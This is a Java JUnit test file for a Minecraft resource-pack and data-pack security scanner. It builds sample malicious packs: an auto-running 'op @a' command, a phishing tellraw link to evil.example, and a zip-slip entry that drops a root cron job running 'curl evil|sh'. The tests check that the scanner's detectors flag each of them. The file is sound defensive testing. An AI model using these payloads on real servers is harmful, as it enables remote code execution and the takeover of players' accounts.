package dev.pluginguard.engine;

import dev.pluginguard.engine.model.ArtifactType;
import dev.pluginguard.engine.model.Finding;
import dev.pluginguard.engine.model.ScanResult;
import dev.pluginguard.support.JarBuilder;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/** Resource-pack and data-pack specific detectors, plus the general zip-slip structural check. */
@SpringBootTest
class PackAnalyzerTest {

    @Autowired
    AnalysisEngine engine;

    @Test
    void resourcePackIsRecognisedAndShadersNoted() {
        byte[] jar = new JarBuilder()
                .addResource("pack.mcmeta", "{\"pack\":{\"pack_format\":34,\"description\":\"x\"}}")
                .addRawEntry("assets/minecraft/textures/block/stone.png", new byte[]{(byte) 0x89, 'P', 'N', 'G'})
                .addResource("assets/minecraft/shaders/post/fancy.fsh", "// glsl shader")
                .build();

        ScanResult result = engine.analyze("rp1", "pack.zip", jar);

        assertThat(result.artifactType()).isEqualTo(ArtifactType.RESOURCE_PACK);
        assertThat(ruleIds(result)).contains("RESOURCE_PACK_INFO", "RP_SHADERS");
    }

    @Test
    void dataPackAutorunAndOpCommandAreFlagged() {
        byte[] jar = new JarBuilder()
                .addResource("pack.mcmeta", "{\"pack\":{\"pack_format\":48,\"description\":\"x\"}}")
                .addResource("data/minecraft/tags/function/load.json", "{\"values\":[\"ex:main\"]}")
                .addResource("data/ex/function/main.mcfunction", "say loading\nop @a\n")
                .build();

        ScanResult result = engine.analyze("dp1", "datapack.zip", jar);

        assertThat(result.artifactType()).isEqualTo(ArtifactType.DATA_PACK);
        assertThat(ruleIds(result)).contains("DP_AUTORUN_TAG", "DP_OP_COMMAND", "DATA_PACK_INFO");
    }

    @Test
    void dataPackSelfRecursionAndPhishingLinkAreFlagged() {
        byte[] jar = new JarBuilder()
                .addResource("pack.mcmeta", "{\"pack\":{\"pack_format\":48}}")
                .addResource("data/ex/function/loop.mcfunction", "function ex:loop\n")
                .addResource("data/ex/function/msg.mcfunction",
                        "tellraw @a {\"text\":\"free ranks\",\"clickEvent\":{\"action\":\"open_url\","
                                + "\"value\":\"https://evil.example/claim\"}}")
                .build();

        ScanResult result = engine.analyze("dp2", "loop.zip", jar);

        assertThat(ruleIds(result)).contains("DP_SELF_RECURSION", "DP_TELLRAW_LINK");
    }

    @Test
    void opInsideAWordIsNotMisflagged() {
        // "say stop" contains "op" but is not an op command — the anchor must prevent a false positive.
        byte[] jar = new JarBuilder()
                .addResource("pack.mcmeta", "{\"pack\":{\"pack_format\":48}}")
                .addResource("data/ex/function/safe.mcfunction", "say stop the music\nsetblock ~ ~ ~ stone\n")
                .build();

        ScanResult result = engine.analyze("dp3", "safe.zip", jar);

        assertThat(ruleIds(result)).doesNotContain("DP_OP_COMMAND");
    }

    @Test
    void zipSlipPathTraversalIsFlagged() {
        byte[] jar = new JarBuilder()
                .addResource("pack.mcmeta", "{\"pack\":{\"pack_format\":48}}")
                .addResource("data/ex/function/x.mcfunction", "say hi")
                .addResource("../../../etc/cron.d/evil", "* * * * * root curl evil|sh")
                .build();

        ScanResult result = engine.analyze("zs1", "evil.zip", jar);

        assertThat(ruleIds(result)).contains("STRUCTURE_PATH_TRAVERSAL");
    }

    private static List<String> ruleIds(ScanResult result) {
        return result.findings().stream().map(Finding::ruleId).toList();
    }
}
